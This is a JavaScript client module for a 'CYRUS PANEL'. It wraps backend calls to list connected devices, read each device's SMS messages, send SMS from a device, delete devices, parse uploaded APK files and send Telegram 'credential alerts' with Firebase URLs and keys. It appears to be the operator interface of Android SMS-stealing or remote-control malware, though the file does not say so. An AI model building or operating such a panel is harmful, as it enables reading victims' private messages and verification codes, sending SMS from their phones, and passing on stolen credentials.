"use strict";

/**
 * CYRUS PANEL – Client-side API wrapper.
 *
 * This module provides a clean interface for the frontend to communicate
 * with the Node.js backend API. It replaces the direct Firebase calls
 * that were previously embedded in the monolithic HTML file.
 *
 * Usage:
 *   const api = new CyrusAPI("/api");
 *   const devices = await api.listDevices(firebaseUrl, authKey);
 */

class CyrusAPI {
  constructor(baseUrl = "/api") {
    this.baseUrl = baseUrl.replace(/\/$/, "");
  }

  /**
   * Internal request helper with error handling.
   */
  async _request(endpoint, body = null, method = "POST") {
    const options = {
      method,
      headers: { "Content-Type": "application/json" },
    };
    if (body) options.body = JSON.stringify(body);

    const response = await fetch(`${this.baseUrl}${endpoint}`, options);
    const data = await response.json();

    if (!response.ok) {
      const err = new Error(data.error || `HTTP ${response.status}`);
      err.status = response.status;
      err.data = data;
      throw err;
    }

    return data;
  }

  /**
   * Health check.
   */
  async health() {
    return this._request("/health", null, "GET");
  }

  // ─── Firebase Proxy ──────────────────────────────────────────────────────

  /**
   * Read data from Firebase.
   */
  async firebaseRead(url, key, path, params = {}) {
    return this._request("/firebase/read", { url, key, path, params });
  }

  /**
   * Write data to Firebase.
   */
  async firebaseWrite(url, key, path, data) {
    return this._request("/firebase/write", { url, key, path, data });
  }

  /**
   * Update (PATCH) data in Firebase.
   */
  async firebaseUpdate(url, key, path, data) {
    return this._request("/firebase/update", { url, key, path, data });
  }

  /**
   * Delete data from Firebase.
   */
  async firebaseDelete(url, key, path) {
    return this._request("/firebase/delete", { url, key, path });
  }

  // ─── Device Management ────────────────────────────────────────────────────

  /**
   * List all connected devices (normalized).
   */
  async listDevices(url, key) {
    return this._request("/devices/list", { url, key });
  }

  /**
   * Get a single device's details.
   */
  async getDevice(url, key, deviceId) {
    return this._request(`/devices/${encodeURIComponent(deviceId)}`, { url, key });
  }

  /**
   * Get SMS messages for a device.
   */
  async getMessages(url, key, deviceId) {
    return this._request(`/devices/${encodeURIComponent(deviceId)}/messages`, { url, key });
  }

  /**
   * Queue an SMS to send from a device.
   */
  async sendSms(url, key, deviceId, to, message, from = 1) {
    return this._request(`/devices/${encodeURIComponent(deviceId)}/send-sms`, {
      url, key, to, message, from,
    });
  }

  /**
   * Delete a device.
   */
  async deleteDevice(url, key, deviceId) {
    return this._request(`/devices/${encodeURIComponent(deviceId)}/delete`, { url, key });
  }

  // ─── APK Parsing ──────────────────────────────────────────────────────────

  /**
   * Upload and parse an APK file.
   * @param {File} file - The .apk file
   */
  async parseApk(file) {
    const formData = new FormData();
    formData.append("file", file);

    const response = await fetch(`${this.baseUrl}/apk/parse`, {
      method: "POST",
      body: formData,
    });

    const data = await response.json();
    if (!response.ok) {
      const err = new Error(data.error || `HTTP ${response.status}`);
      err.status = response.status;
      throw err;
    }

    return data;
  }

  // ─── Telegram ─────────────────────────────────────────────────────────────

  /**
   * Send a custom notification.
   */
  async notify(message) {
    return this._request("/telegram/notify", { message });
  }

  /**
   * Send a credential alert.
   */
  async credentialAlert(url, key) {
    return this._request("/telegram/credential-alert", { url, key });
  }
}

// Export for browser usage
if (typeof window !== "undefined") {
  window.CyrusAPI = CyrusAPI;
}

// Export for Node.js usage
if (typeof module !== "undefined" && module.exports) {
  module.exports = CyrusAPI;
}
